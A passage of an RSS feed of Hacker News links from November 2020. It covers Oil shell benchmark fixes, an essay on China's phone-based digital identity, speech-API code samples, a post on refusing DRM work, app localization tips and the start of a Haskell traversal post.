<p>A few weeks ago, I published <a href="http://www.oilshell.org/blog/2020/11/metrics.html">Metrics for Oil 0.8.4</a>.  It
establishes a rough performance baseline before enabling garbage collection.</p>
<p>This is a <strong>small update</strong> to that baseline, released with <a href="https://www.oilshell.org/release/0.8.5/">Oil 0.8.5</a>.  I
noticed some problems with the benchmarks after partially integrating the
garbage collector (which now works on small examples!)</p>
<p>This post doesn't invalidate anything I've said in the past.  It just adds some
detail!</p>
 
<a name="fix-dont-use-asan-when-benchmarking"></a>
<h2>Fix: Don't use ASAN When Benchmarking</h2>
<p>The <code>mycpp-examples</code> benchmark shows how much we can speed up small pieces of
code by translating them from staticall-typed Python to C++.</p>
<ul>
<li><a href="http://www.oilshell.org/release/0.8.4/benchmarks.wwz/mycpp-examples/">benchmarks/mycpp-examples 0.8.4</a></li>
<li><a href="http://www.oilshell.org/release/0.8.5/benchmarks.wwz/mycpp-examples/">benchmarks/mycpp-examples 0.8.5</a></li>
</ul>
<p>Silly bug: I was building the C++ code with <a href="http://www.oilshell.org/cross-ref.html?tag=asan#asan">ASAN</a>!  When ASAN is
on, the compiler generates code that uses "shadow memory" to detect memory
unsafety at runtime.  This increases the size of every allocation, and makes
code slower.  Examples:</p>
<ul>
<li><code>classes</code> went from taking <strong>728</strong> ms to <strong>1.9</strong> ms</li>
<li><code>length</code> went from taking <strong>734</strong> ms to <strong>167</strong> ms</li>
<li><code>cartesian</code> went from <strong>1033</strong> MB of heap usage to <strong>611</strong> MB</li>
<li><code>parse</code> went from <strong>972</strong> MB of heap usage to <strong>137</strong> MB</li>
</ul>
<p>So the Python-to-C++ speedups look even more impressive now.  (But remember
that <a href="http://www.oilshell.org/cross-ref.html?tag=mycpp#mycpp">mycpp</a> is <strong>not</strong> a general purpose tool.)</p>
<a name="fix-a-python-process-cant-measure-a-shell-child-process"></a>
<h2>Fix: A Python Process Can't Measure A Shell Child Process</h2>
<p>The <code>compute</code> benchmark measures the Oil interpreter vs. bash and Python on
small code examples.</p>
<ul>
<li><a href="http://www.oilshell.org/release/0.8.4/benchmarks.wwz/compute/">benchmarks/compute 0.8.4</a></li>
<li><a href="http://www.oilshell.org/release/0.8.5/benchmarks.wwz/compute/">benchmarks/compute 0.8.5</a></li>
</ul>
<p>I noticed that bash and Python both used a minimum of 6 MB of virtual memory
(<code>Max RSS</code>).  However, this turned out to be a <strong>benchmark bug</strong>.  We were
using <a href="https://github.com/oilshell/oil/blob/master/benchmarks/time_.py">benchmarks/time_.py</a>, a tool written in Python, to measure the
memory of a bash process!</p>
<p>Specifically, we used <code>subprocess.call()</code> and then <code>resource.getrusage()</code>.
This doesn't work because Python first <strong>forks its larger address space</strong>, and
then calls <code>exec()</code> to start bash.</p>
<p>That is, we measured the memory usage of Python, not bash.  This person ran
into the same issue:</p>
<ul>
<li><a href="https://stackoverflow.com/questions/13880724/python-getrusage-with-rusage-children-behaves-stangely">Python getrusage with RUSAGE_CHILDREN behaves strangely?</a></li>
</ul>
<a name="why-i-wrote-a-timing-tool-in-c"></a>
<h3>Why I Wrote A Timing Tool in C</h3>
<p>To fix this, I first changed <code>time_.py</code> to shell out to <code>/usr/bin/time</code>, a GNU
utility written in C which has a small address space.  Two problems:</p>
<ul>
<li>It only has precision in ticks or hundredths of a second, which isn't good
enough for our benchmarks.  The ratios shifted significantly because of this
inaccuracy.</li>
<li>It also tends to print error messages to its output, which is bad for
automation.  We want clean TSV output.</li>
</ul>
<p>What about bash's <code>time</code> keyword (which Oil implements)?</p>
<ul>
<li>It doesn't have a way to get the exit code or memory usage.</li>
<li>It's hard to make it append to a TSV file.</li>
</ul>
<p>So I wrote my own <a href="https://github.com/oilshell/oil/blob/master/benchmarks/time-helper.c">benchmarks/time-helper.c</a>.  It's surprising to
find these basic deficiencies in common tools!  I guess I need to build
something better into Oil, but that's more work on top of a big pile.</p>
<a name="update-the-parser-is-slower"></a>
<h2>Update: The Parser is Slower</h2>
<p>The parsing benchmarks compare <code>$sh -n</code> across different shells on 10 files:</p>
<ul>
<li><a href="http://www.oilshell.org/release/0.8.4/benchmarks.wwz/osh-parser/">benchmarks/osh-parser 0.8.4</a></li>
<li><a href="http://www.oilshell.org/release/0.8.5/benchmarks.wwz/osh-parser/">benchmarks/osh-parser 0.8.5</a></li>
</ul>
<p>The 0.8.5 release is the first one where <code>oil-native</code> is <strong>slower</strong> than bash!</p>
<ul>
<li>oil-native: <strong>222</strong> lines/ms and <strong>593</strong> lines/ms</li>
<li>bash: <strong>247</strong> lines/ms and <strong>645</strong> lines/ms</li>
</ul>
<p>I believe this is due to the partially-integrated garbage collector.  <strong>Every
C++ function</strong> now has a <code>StackRoots</code> invocation to register pointers.</p>
<p>This operation should be very cheap, but I would guess that it also inhibits
some compiler optimizations.  We're passing pointers to locals to be stored in
a global (or thread local) data structure.</p>
<p>I mentioned this possibility in the <a href="http://www.oilshell.org/blog/2020/01/parser-benchmarks.html#caveats">Caveats to January's performance
post</a>:</p>
<blockquote>
<p>I expect performance to go up and down in future releases, but in the long
term it should be faster</p>
</blockquote>
<p>I probably won't have time to optimize the <a href="http://www.oilshell.org/cross-ref.html?tag=mycpp#mycpp">mycpp</a> translation of the
parser for many months, but it should be possible with enough effort.  Remember
that Oil is "hilariously unoptimized".  (As always, I can use help!)</p>
<a name="whats-next"></a>
<h2>What's Next?</h2>
<p>After fixing these benchmarks, I had a nice experience with
<a href="https://builds.sr.ht/">builds.sr.ht</a>, the Sourcehut build service.  I was
driven there by the increasing flakiness of Travis CI.</p>
<p>I want to write a blog post about it, but I should really get back to work on
the <strong>garbage collector</strong>.</p>
<a name="buildssrht-and-toil"></a>
<h3>builds.sr.ht and Toil</h3>
<p>Here's a brief outline instead:</p>
<ul>
<li>It took me a matter of minutes to get a test build running.  The service is
snappy and the docs are good.</li>
<li>I ported Oil's continuous build in a day or so.  We have a complex build with
many tasks because we use a lot of <a href="http://www.oilshell.org/cross-ref.html?tag=metaprogramming#metaprogramming">metaprogramming</a>.
<ul>
<li>I described the "Toil" continuous build back in March: <a href="http://www.oilshell.org/blog/2020/03/release-0.8.pre3.html#shell-the-good-parts">Oil 0.8.pre3 - A
Line Editor and a Continuous
Build</a></li>
</ul>
</li>
<li>This leads to an interesting milestone: <code>services/toil</code> is a shell script and
web interface that runs on <strong>multiple CI services</strong>.
<ul>
<li>A concrete benefit of this is that we could use sourcehut's FreeBSD support
and Travis CI's OS X support in parallel.</li>
</ul>
</li>
<li>I want to write a bit about the style of Toil.  I would call it "distributed
shell programming with <strong>concretions</strong>" (rather than abstractions).
<ul>
<li>It uses TSV, JSON, and a <a href="http://www.oilshell.org/cross-ref.html?tag=wwz#wwz">wwz</a> archive of logs.  That is, we don't
serialize and deserialize "objects".  We just work with well-formed data.
The shell can help with this.</li>
<li>It spans Dreamhost, sourcehut, Travis CI, and my own development machine.
(I'd also like to try it on Github Actions.) It's a "heterogeneous"
distributed system.  It uses <code>ssh</code> for auth.</li>
<li>What do these platforms have in common?  They are based on <strong>Linux</strong>, which
can run a <strong>shell</strong>!</li>
</ul>
</li>
</ul>
<p>(<a href="https://oilshell.zulipchat.com/#narrow/stream/121539-oil-dev/topic/notes.20on.20builds.2Esr.2Eht">Zulip notes on builds.sr.ht</a>)</p>
<p><a href="https://old.reddit.com/r/oilshell/comments/jzoslh/fixes_and_updates_to_oil_benchmarks/?">Let me know</a> if you have questions!</p>




</div>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/11/fixes-and-updates.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25191032</guid>
            <pubDate>Mon, 23 Nov 2020 19:59:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can an F1 Car Drive on the Ceiling?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25190797">thread link</a>) | @mmmbn
<br/>
November 23, 2020 | https://www.claytex.com/tech-blog/can-an-f1-car-drive-on-the-ceiling/ | <a href="https://web.archive.org/web/*/https://www.claytex.com/tech-blog/can-an-f1-car-drive-on-the-ceiling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.claytex.com/tech-blog/can-an-f1-car-drive-on-the-ceiling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25190797</guid>
            <pubDate>Mon, 23 Nov 2020 19:42:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[In China, without a digital identity, you barely have an identity at all]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25190746">thread link</a>) | @gbseventeen3331
<br/>
November 23, 2020 | https://restofworld.org/2020/the-suffocation-of-chinese-internet/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/the-suffocation-of-chinese-internet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>At the end of August, I arrived in Shanghai on a trip back from London. After two weeks of quarantine, I emerged on a smoggy Monday morning thrilled for my first taste of freedom, until I realized that I had made a careless but dire mistake: I forgot to bring my mobile SIM card.</p>



<p>Without my phone number to verify my identity and confirm that I had followed proper Covid-19 precautions, the health code I had been assigned by authorities stayed red. The day I left quarantine, I tried to check into a hotel in Shanghai. When the man at the front desk saw my code, he eyed me warily, as if I had a scarlet letter etched onto my forehead, and only allowed me to check in after scrutinizing my physical quarantine papers. That night, when I met up for dinner with a friend and showed him my code, he recoiled. “Ugh. Please put that thing away,” he said, only half-jokingly. “It makes me anxious just to look at it.” We were in a city where there had been no cases of local transmission in months, and as a young, tech-savvy, white-collar worker with resources and workarounds, I was luckier than most. Yet in that moment, I felt like a pariah: unregistered and unrecognized on the outskirts of society.</p>



<p>In China, your phone number is your identity. Over the last two decades, the country leapfrogged from a relatively antiquated technological infrastructure straight into the mobile internet, which is now deeply embedded in every facet of life. By the time I returned to live in Beijing in 2018, bright-yellow share bikes were all over the streets, and savvy beggars panhandled with QR codes. My phone was suddenly my wallet, my transportation ticket, and my source of nourishment, entertainment, and socializing. With it, I could order dinner and pay rent, browse through <a href="https://www.nytimes.com/2020/03/05/magazine/blued-china-gay-dating-app.html">queer dating prospects</a>, and get <a href="https://www.statnews.com/2018/09/27/china-embraces-consumer-genetic-testing/">my genes sequenced</a>. Without it, I could barely function. More than anywhere else in the world, in China, one’s digital and physical selves are conflated. An online presence confirms an offline existence.</p>



<p>Since the onset of the pandemic, this has been pushed even further. This past February, in an attempt to control the virus’s spread, the government assigned every smartphone owner in China a health QR code. First trialed in the city of Hangzhou, the system launched nationwide on the popular platforms WeChat and Alipay, which critics have compared to the United States’ Centers for Disease Control and Prevention collaborating with Amazon and Facebook to track the health of all their users. To obtain a code, you have to register your name, travel history, identification, and phone number. This information is then correlated with the tracking data on your device, to assess if you’ve had contact with potential Covid-19 patients. Then, you are assigned a color — green, yellow, or red — which determines whether you will be allowed to move freely, enter buildings, and take public transportation.</p>



<p>As the Chinese internet has evolved within the boundaries of the Great Firewall, I’ve come to view the space as a walled garden. The metaphor is not mine but stolen from Lu Wei, the former deputy head of the Chinese government’s propaganda department. Lu once <a href="https://chinacopyrightandmedia.wordpress.com/2013/10/30/lu-wei-concentrate-positive-energy-online-build-the-chinese-dream-together/">proclaimed</a> the country’s cyberspace as a “spiritual garden, which worships virtue and the good” (which could refer to anything from patriotism and pandas to filial piety) and condemns the “false, the bad, and the ugly” (hip-hop, tattoos, or Winnie the Pooh, for instance). Just as the imperial gardens of ancient China were carefully pruned spaces sealed off from the outside world, the country’s internet, firewalled from the global web, has become an isolated ecosystem, governed by an opaque and arbitrary set of rules.</p>



<p>In recent months, these garden walls have been upgraded to safeguard not only the “spiritual” but the physical health of inhabitants. And in the eyes of authorities, the two are increasingly one and the same. In May, proactive officials in Hangzhou <a href="https://www.cnn.com/2020/05/25/tech/hangzhou-health-app-intl-hnk/index.html">proposed</a> expanding the health code system and integrating it even more into daily life. Citizens would be assigned a health score between 0 and 100 that would fluctuate based on lifestyle choices: 15,000 daily steps could boost a score by 5 points, while 200 millimeters of baijiu (a noxious Chinese liquor) could mean a reduction of 1.5 points. In September, officials in the neighboring city of Suzhou followed suit, <a href="https://www.scmp.com/abacus/tech/article/3100516/suzhou-city-takes-page-chinas-social-credit-system-civility-code-rates">introducing plans for a “civility code”</a> that would apply a similar rubric to activities, such as doing volunteer work and jaywalking. Both plans were quickly retracted in the wake of a public backlash, but the technology needed to implement them is already in place, and most crucially, so is the vision of this future world.</p>



<p>Today, to truly enter China is no longer a matter of simply swapping out a SIM card. To step into the garden is to inhabit another world, to hail a DiDi instead of an Uber, scroll through a pruned Weibo feed instead of an unruly Twitter one, date on Momo instead of Tinder, dance to a BTS hit on Douyin instead of a Megan Thee Stallion remix on TikTok. Given how inextricably entwined our offline selves are with our online personas, to live inside the garden requires the creation of a particular kind of identity<em>. </em>After all,<em> </em>our digital worlds do not simply reflect who we are: they shape that person. The Yi-Ling I am on Facebook is a different person from the Yi-Ling I am on WeChat (more distracted, more creative, much more cautious), with different habits, friends, and communities. When the headlines warn of a bifurcated internet — with China strengthening its Great Firewall and Secretary of State Pompeo urging the construction of a “Clean Fortress” around American data — it is important to remember that these divisions extend down to the intimate and the individual, each crack in cyberspace running deep into flesh and bone.</p>



<p>Having straddled the fault lines of two digital ecosystems all of my life, the division runs deep through my psyche. Who will I become in a digitally bifurcated world? Can these selves ever be reconciled? And beyond that, will it ever be possible to tell a more plural and expansive story of the global internet, one that can weave together strands of messy identities and frame a larger picture? </p>



<p>When I got my new SIM card in Beijing two days later, I felt wonderfully and troublingly whole again. I could hail a cab, get a haircut,<strong> </strong>have a box of fresh, imported kiwis delivered to my doorstep. I was both delighted by the world that opened up before me — limitless, seamless, and virus-free — and unnerved by the deal that I had made: data for convenience, privacy for safety. I was back in the garden, left to contemplate what I might gain, what more I might lose, and what I had already lost.</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/the-suffocation-of-chinese-internet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25190746</guid>
            <pubDate>Mon, 23 Nov 2020 19:37:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Speech Recognition and Audio Summarization API]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25190585">thread link</a>) | @robgehring
<br/>
November 23, 2020 | https://speechtext.ai/speech-recognition-api | <a href="https://web.archive.org/web/*/https://speechtext.ai/speech-recognition-api">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h2>Quick and Simple Integration</h2>
            <p>Build accurate speech recognition applications in minutes. We take care of the complexity behind and wrap it in a few lines of code.</p>
        </div><div>
            <div>
                
            <div id="samples-content">
                
                <div id="one" role="tabpanel" aria-labelledby="one-tab">
                    <pre><code>
import requests
import json

secret_key = "SECRET_KEY"

# loads the audio into memory
with open("/path/to/your/file.mp3", mode="rb") as file:
  post_body = file.read()

API_URL = "https://api.speechtext.ai/recognize?"
header = {'Content-Type': "application/octet-stream"}

options = {
  "key" : secret_key,
  "language" : "en-US",
  "punctuation" : True,
  "speaker_detection": True,
  "format" : "mp3"
}
# send an audio file to SpeechText.AI
r = requests.post(API_URL, headers = header, params = options, data = post_body)
                      </code></pre>
                </div>
                <div id="two" role="tabpanel" aria-labelledby="two-tab">
                    <pre><code>
# create transcription task
curl -H "Content-Type:application/octet-stream" --data-binary @/path/to/your/file.m4a "https://api.speechtext.ai/recognize?key=SECRET_KEY&amp;language=en-US&amp;punctuation=true&amp;speaker_detection=true&amp;format=m4a"

# retrieve transcription results
curl -X GET "https://api.speechtext.ai/results?key=SECRET_KEY&amp;task=TASK_ID&amp;summary=true&amp;summary_size=15&amp;highlights=true&amp;max_keywords=10"

# get captions
curl -X GET "https://api.speechtext.ai/results?key=SECRET_KEY&amp;task=TASK_ID&amp;output=srt&amp;max_caption_words=10"

# process public URL
curl -X GET "https://api.speechtext.ai/recognize?key=SECRET_KEY&amp;url=PUBLIC_URL&amp;language=en-US&amp;punctuation=true&amp;speaker_detection=true&amp;format=mp3"
                    </code></pre>
                </div>
                <div id="three" role="tabpanel" aria-labelledby="three-tab">
                    <pre><code>
&lt;?php

$secret_key = "SECRET_KEY";

# loads the audio
$filesize = filesize('/path/to/your/file.m4a');
$fp = fopen('/path/to/your/file.m4a', 'rb');
// read the entire file into a binary string
$binary = fread($fp, $filesize);

# endpoint and options to start a transcription task
$endpoint = "https://api.speechtext.ai/recognize?key=".$secret_key."&amp;language=en-US&amp;punctuation=true&amp;speaker_detection=true&amp;format=m4a";
$header = array('Content-type: application/octet-stream');

# curl connection initialization
$ch = curl_init();

# curl options
curl_setopt_array($ch, array(
    CURLOPT_URL =&gt; $endpoint,
    CURLOPT_RETURNTRANSFER =&gt; true,
    CURLOPT_POST =&gt; true,
    CURLOPT_HEADER =&gt; false,
    CURLOPT_HTTPHEADER =&gt; $header,
    CURLOPT_POSTFIELDS =&gt; $binary,
    CURLOPT_FOLLOWLOCATION =&gt; true
));

# send an audio transcription request
$body = curl_exec($ch);

curl_close($ch);
                    </code></pre>
                </div>
                <div id="four" role="tabpanel" aria-labelledby="four-tab">
                    <pre><code>
import java.net.*;
import java.io.*;
import java.util.concurrent.TimeUnit;
import org.json.*;


public class Transcriber {

    public static void main(String[] args) throws Exception {
        String secret_key = "SECRET_KEY";
        HttpURLConnection conn;
        
        // endpoint and options to start a transcription task
        URL endpoint = new URL("https://api.speechtext.ai/recognize?key=" + secret_key +"&amp;language=en-US&amp;punctuation=true&amp;speaker_detection=true&amp;format=m4a");
        
        // loads the audio into memory
        File file = new File("/path/to/your/file.m4a");
        RandomAccessFile f = new RandomAccessFile(file, "r");
        long sz = f.length();
        byte[] post_body = new byte[(int) sz];
        f.readFully(post_body);
        f.close();
        
        // send an audio transcription request
        conn = (HttpURLConnection) endpoint.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        
        conn.setDoOutput(true);
        conn.connect();
        OutputStream os = conn.getOutputStream();
        os.write(post_body);
        os.flush();
        os.close();
        
    }
}
                    </code></pre>
                </div>
            </div>
            </div>
        </div></div>]]>
            </description>
            <link>https://speechtext.ai/speech-recognition-api</link>
            <guid isPermaLink="false">hacker-news-small-sites-25190585</guid>
            <pubDate>Mon, 23 Nov 2020 19:22:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Saying “No” to Unethical Tasks]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25190536">thread link</a>) | @stargrave
<br/>
November 23, 2020 | https://emersion.fr/blog/2020/saying-no-to-unethical-tasks/ | <a href="https://web.archive.org/web/*/https://emersion.fr/blog/2020/saying-no-to-unethical-tasks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
	<nav><a href="https://emersion.fr/">home</a> ·
	<a href="https://emersion.fr/blog">blog</a> ·
	<a rel="me" href="https://github.com/emersion">github</a> ·
	<a rel="me" href="https://sr.ht/~emersion">sourcehut</a> ·
	<a href="https://emersion.fr/.well-known/openpgpkey/hu/dj3498u4hyyarh35rkjfnghbjxug6b19" title="PGP key 34FF9526CFEF0E97A340E2E40FDE7BE0E88F5E48" download="emersion.pgp">pgp</a> ·
	<a rel="me" href="https://octodon.social/@emersion">mastodon</a> ·
	<a href="https://sourcehut.org/consultancy/">consulting</a> ·
	<a rel="me" href="http://emersion-fr.deviantart.com/">deviantart</a>
</nav>


	<main>


<article lang="en">
	<header>
		
		<time datetime="2020-11-23T00:00:00+02:00">2020-11-23</time>
	</header>

	<p>Back in spring 2019, I was a student working as an intern at the Intel Open
Source Graphics Center in Finland. I was mainly focused on improving
<a href="https://gitlab.freedesktop.org/drm/igt-gpu-tools/">igt-gpu-tools</a>, the test suite that runs each time a patch is submitted for
the i915 kernel driver. I really liked the work I was doing there, and enjoyed
interacting with all of the people on site. While I was there, I had an
opportunity to say “no” to an assigned task that I considered unethical.</p>
<p>Naturally, lots of Intel kernel developers were working on fixing bugs and
implementing new features. When a developer wants to add a new feature to their
kernel driver, they also need to provide a patch for a user-space program to
exercise the feature in a real-world scenario and prove that the new user-space
API is sensible<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. For instance, when adding HDR support to i915, the kernel
developers worked with the Kodi team.</p>
<p>At that time, I had just been nominated as release manager for the Wayland and
Weston projects. Additionally, some Intel engineers were working on upstreaming
Weston patches to add a new feature to their driver. In fact, the kernel
patches were ready to be merged and only blocked by the user-space
requirements. Some deadlines were set too, so it was important to get the
patches merged in a timely manner. My manager asked me to help with the
upstreaming process. That was a pretty good idea – because my experience could
help Intel developers to learn how to contribute to Weston, and because I like
mentoring people. So what was the catch?</p>
<p>It turned out the feature being developed was <a href="https://en.wikipedia.org/wiki/High-bandwidth_Digital_Content_Protection">HDCP</a>. It’s a form of <abbr title="Digital Restrictions Management">DRM</abbr> that encrypts the video
stream between the GPU and the screen. I’m personally not okay with DRM in
general, and I find DRM to be unethical. I’m not going to start to argue why I
feel this way, because it doesn’t really matter in the context of this article.
Feel free to replace DRM with whatever you find unethical.</p>
<p>So, I started participating in meetings and discussing how to get the
HDCP patches merged. I wasn’t very comfortable with the whole situation, and
tried to stay away from it when possible. I considered saying “no”, but I was
scared. I was only working at Intel for a few weeks, I was still a student, I
didn’t know my teammates and managers too well, and I was interested in
eventually getting a job offer. I just continued as if nothing was wrong.</p>
<p>At some point, after asking advice and discussing with some friends, I realized
that I ought to speak up. If I didn’t say “no” this time, it would get a lot
more difficult to say “no” the next time. So I ignored the anxiety and clumsily
explained to my manager that I’d like to stop working on HDCP.</p>
<p>To my surprise, my manager just said that it was fine, that there was no
problem. After this event, absolutely nothing else changed, and at some point I
even got an employment offer. When I recall it now, I can only tell myself that
it was a lot of fuss for nothing. In hindsight, I should’ve been less scared
and said no earlier, but in these situations it’s easy to imagine nightmare
scenarios in your head!</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>See <a href="https://dri.freedesktop.org/docs/drm/gpu/drm-uapi.html#open-source-userspace-requirements">the kernel docs</a> for more info. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>


	
	
	
</article>

	</main>

	
</div></div>]]>
            </description>
            <link>https://emersion.fr/blog/2020/saying-no-to-unethical-tasks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25190536</guid>
            <pubDate>Mon, 23 Nov 2020 19:19:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Translate a Web or Mobile Application: 9 Best Practices]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25190357">thread link</a>) | @pablius
<br/>
November 23, 2020 | https://languageburo.com/blog/how-to-translate-a-web-or-mobile-application | <a href="https://web.archive.org/web/*/https://languageburo.com/blog/how-to-translate-a-web-or-mobile-application">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div id="main-content">
          <article>
            <span>Website Translations,App Translations</span>

            

                        
              <figure>
                <img src="https://languageburo.com/thumbs/blog/how-to-translate-a-web-or-mobile-application/carina-bianchi-author-80x80.jpg" alt="Carina Bianchi" title="Carina Bianchi">
              </figure>

            
            

            <p>After receiving so much feedback and inquiries on <a href="https://languageburo.com/blog/steps-for-translating-a-website-for-a-new-market">our last post about website translation</a>, we came up with this follow up. Here are some of the best practices we’ve used to achieve excellent results for our clients needing web or mobile application translation and localization. </p>
<p>Are you planning to expand your startup abroad? Wondering how you can translate your web or mobile application and reach a wider audience? You’re in the right place because we’re going to share some of the best practices for localization in this article.</p>
<figure><iframe src="//youtube.com/embed/3zMdDT2nlMo" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="true" width="825" height="464"></iframe></figure>
<p>Translating your app allows you to <a href="https://languageburo.com/blog/steps-for-translating-a-website-for-a-new-market">enter a new market</a>, improve brand awareness, and increase revenue. Going global unlocks huge potential; international customers <a href="https://insights.csa-research.com/reportaction/305013126/Marketing">prefer to use their native language</a> online. To have greater success, you need to provide your apps in their language. </p>
<p>Web and mobile app translation and localization go beyond just content adaptation. Your goal should be to create a custom made application suitable for your target market. </p>
<p><strong>Here are nine best practices of translating a web or mobile application.</strong></p>
<h2>Set Your Strategy</h2>
<p>One of the first steps in app localization is to identify your target market and language. Analyze your existing users to find if there’s any untapped potential. Before you start expanding internationally, ask yourself if there’s a need for your app in the market you’re planning to target. </p>
<p>Ensure your app is localization-friendly beforehand. Separate the source code from the actual content that’s going to be translated later. Prior app internationalization will save you a lot of time and money throughout the project. </p>
<h2>Hire a Professional Translation Agency</h2>
<p>When adapting content from one language to another, it’s essential to ensure a seamless user experience. That’s why you should <a href="https://languageburo.com/professional-translation-services/website-translation-services">hire a professional translation company</a> to translate, optimize, and localize your app. </p>
<p>Professional translation agencies perform app localization, which includes formatting, editing, and cultural adaptation. Some languages change word length or writing direction when translated; with professionals’ help, you won’t need to worry about these alterations.<br>
Use a Translator that works with the file format you provide</p>
<p><a href="https://languageburo.com/professional-translation-services">Professional translators</a> can work with many file formats and make sure they can work with the files as you provide them. This way, you can integrate their work directly into your app and revision control system, without further work. Also, this will streamline the process and reduce involuntary human errors. For instance, at Language Buró, we will deliver the translated copy in the same format as the original.</p>
<figure><img src="https://languageburo.com/content/1-blog/10-how-to-translate-a-web-or-mobile-application/resource-bundles-for-translating-app.jpg" alt="Isolate all text and messages to translate in resource bundles"></figure>
<h2>Resource Bundles</h2>
<p>Isolate all text and messages to translate in resource bundles; these are special files in your application that contain the original text to be translated. All popular web and app development frameworks provide libraries to achieve this from the get-go. For example, if developing for Apple devices, the first step to localize your app is to export the <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPInternational/LocalizingYourApp/LocalizingYourApp.html">development language or base localization for translation</a>. For Android, you should start <a href="https://developer.android.com/training/basics/supporting-devices/languages">creating the locale directories and resource files</a>. </p>
<figure><img src="https://languageburo.com/content/1-blog/10-how-to-translate-a-web-or-mobile-application/provide-context-for-your-translation-agency.jpg" alt="Provide instructions on the application interface so that the translation agency can understand your message’s context"></figure>
<h2>Provide Context</h2>
<p>Be sure to provide instructions on the application interface so that the translation agency can understand your message’s context. Take your time to help translators understand what your strings should achieve. Give them access to the UI, provide screenshots, and share your notes. Having context will allow your professional partner to translate the app clearly and accurately. </p>
<figure><img src="https://languageburo.com/content/1-blog/10-how-to-translate-a-web-or-mobile-application/localize-visual-content.jpg" alt="App localization starts with development and design"></figure>
<h2>Localize Visual Content</h2>
<p>Some languages require more space and characters for the text, while some even change text direction. That’s why app localization starts with development and design. Your interface should be localization friendly from the visual side as well.  Also, if any labels shouldn’t exceed a particular length, you should inform the translators in advance to work around the limitation.</p>
<h2>Create a Glossary</h2>
<p>If your app uses company-specific terminology, be sure to provide a glossary for the translators. A glossary will help keep the text consistent throughout the application and ensure better user experience.</p>
<h2>Language logic</h2>
<p>You will face the need to introduce additional logic to cover the grammatical differences of the target languages. Make sure this is correctly implemented in your application and provide instructions and guidelines to your translation partner to apply those rules in the translated version.</p>
<figure><img src="https://languageburo.com/content/1-blog/10-how-to-translate-a-web-or-mobile-application/separate-text-from-images.jpg" alt="If you want the project to run smoothly, you should get rid of text on images"></figure>
<h2>Separate Text From Images</h2>
<p>If you want the project to run smoothly, you should get rid of text on images. You will save a lot of time and trouble! Instead, use filler images and overlap the text programmatically. Avoiding Images with text in another language shows users that you built the app for them.</p>
<p>Although translating and localizing a web or mobile application can be challenging, with a professional translation company, you’ll be able to offer a custom made experience to audiences around the globe.</p>
<p>At <a href="https://languageburo.com/professional-translation-services/website-translation-services">Language Buró</a>, web and mobile application translation services go beyond just translating. We provide localization and content optimization to ensure a seamless user experience transition from one language to the other. We’re eager to get your project started, please <a href="https://languageburo.com/contact">book a free consultation with us here</a>.</p>
          </article>
        </div>

      </div>
    </div></div>]]>
            </description>
            <link>https://languageburo.com/blog/how-to-translate-a-web-or-mobile-application</link>
            <guid isPermaLink="false">hacker-news-small-sites-25190357</guid>
            <pubDate>Mon, 23 Nov 2020 19:05:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Queue for Effectful Breadth-First Traversals]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25190094">thread link</a>) | @headalgorithm
<br/>
November 23, 2020 | https://doisinkidney.com/posts/2020-11-23-applicative-queue.html | <a href="https://web.archive.org/web/*/https://doisinkidney.com/posts/2020-11-23-applicative-queue.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
            

            <p>
    Posted on November 23, 2020
</p>



<p>We pick up the story again at the question of a breadth-first (Applicative) traversal of a rose tree <span data-cites="gibbons_breadthfirst_2015">(Gibbons <a href="#ref-gibbons_breadthfirst_2015" role="doc-biblioref">2015</a>)</span>. In the last post, I finally came up with an implementation I was happy with:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>data</span> <span>Tree</span> a <span>=</span> a <span>:&amp;</span> [<span>Tree</span> a]</span>
<span id="cb1-2"></span>
<span id="cb1-3"><span>bft ::</span> <span>Applicative</span> f <span>=&gt;</span> (a <span>-&gt;</span> f b) <span>-&gt;</span> <span>Tree</span> a <span>-&gt;</span> f (<span>Tree</span> b)</span>
<span id="cb1-4">bft f (x <span>:&amp;</span> xs) <span>=</span> liftA2 (<span>:&amp;</span>) (f x) (bftF f xs)</span>
<span id="cb1-5"></span>
